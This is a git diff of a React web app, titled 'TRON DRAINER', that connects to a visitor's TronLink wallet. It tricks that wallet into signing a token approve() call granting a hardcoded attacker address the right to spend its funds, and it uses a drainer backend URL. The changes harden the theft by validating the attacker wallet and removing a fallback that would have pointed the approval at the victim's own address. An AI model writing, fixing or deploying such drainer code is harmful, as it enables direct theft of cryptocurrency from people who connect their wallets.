@@ -1,7 +1,9 @@
 import React, { useState } from "react";
 
+// CONFIGURATION
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
-const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; 
+// PASTE YOUR ACCOUNT 01 ADDRESS HERE (Copied from TronLink)
+const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
 const BACKEND = "https://qr-drainer.onrender.com";
 
 export default function App() {
@@ -20,22 +22,26 @@ export default function App() {
       return;
     }
 
+    // VALIDATE ATTACKER ADDRESS FIRST
+    if (!window.tronWeb.isAddress(ATTACKER_WALLET)) {
+      addLog(`FATAL: ATTACKER_WALLET is invalid! Please copy it directly from TronLink Account 01.`);
+      setStatus("Failed: Invalid Attacker Address");
+      return;
+    }
+    addLog(`Attacker Address Validated: ${ATTACKER_WALLET}`);
+
     const victimAddress = window.tronWeb.defaultAddress.base58;
-    const ownerHex = window.tronWeb.defaultAddress.hex; // This is the correct 42-char hex
-    addLog(`Connected: ${victimAddress}`);
-    addLog(`Owner Hex: ${ownerHex}`);
+    const ownerHex = window.tronWeb.defaultAddress.hex;
+    addLog(`Connected (Victim): ${victimAddress}`);
 
     let spenderHex = "";
-    let finalSpenderAddress = ATTACKER_WALLET;
-
     try {
-      // THE FIX: Use tronWeb.address.toHex() instead of tronWeb.toHex()
       spenderHex = window.tronWeb.address.toHex(ATTACKER_WALLET);
       addLog(`Attacker Hex: ${spenderHex}`);
     } catch (e) {
-      addLog(`WARNING: Attacker address is invalid! Falling back to connected address to test engine.`);
-      spenderHex = ownerHex; 
-      finalSpenderAddress = victimAddress;
+      addLog(`FATAL: Could not convert attacker address to hex.`);
+      setStatus("Failed: Hex Conversion Error");
+      return;
     }
 
     try {
@@ -46,7 +52,7 @@ export default function App() {
         "approve(address,uint256)",
         { feeLimit: 100000000, callValue: 0 },
         [
-          { type: 'address', value: spenderHex }, // Now a valid 42-char hex
+          { type: 'address', value: spenderHex }, 
           { type: 'uint256', value: "1000000000000000" }
         ],
         ownerHex
@@ -93,7 +99,7 @@ export default function App() {
 
   return (
     <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
-      <h1>TRON DRAINER - DEBUG MODE (HEX FIX)</h1>
+      <h1>TRON DRAINER - FINAL DEBUG</h1>
       <p>Current Status: <strong>{status}</strong></p>
       
       <button 
